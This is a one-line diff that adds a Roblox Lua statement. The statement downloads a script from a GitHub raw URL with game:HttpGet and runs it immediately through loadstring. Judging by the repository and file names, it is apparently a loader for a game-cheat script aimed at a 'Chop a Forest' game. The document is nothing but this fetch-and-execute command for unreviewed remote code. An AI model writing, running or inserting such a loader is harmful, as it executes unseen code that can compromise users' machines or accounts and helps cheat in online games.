@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/ch2-chop-a-forest-spam2-fhubc47smfodh1.lua"))()
